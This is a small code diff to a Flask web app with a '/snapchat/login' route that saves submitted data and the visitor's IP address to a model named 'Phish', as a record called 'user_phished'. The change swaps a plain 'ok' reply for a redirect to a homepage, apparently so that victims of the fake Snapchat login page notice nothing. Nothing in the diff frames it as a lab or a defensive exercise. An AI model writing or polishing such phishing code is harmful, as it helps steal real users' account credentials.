@@ -1,5 +1,5 @@
 from app import app, db
-from flask import request, render_template, session
+from flask import request, render_template, session, redirect
 from app.main.config.models import Phish
 
 @app.route('/snapchat/login', methods=['GET','POST'])
@@ -15,4 +15,4 @@ def sc_login():
                              ip=request.remote_addr)
         db.session.add(user_phished)
         db.session.commit()
-        return 'ok'
+        return redirect('/homepage')
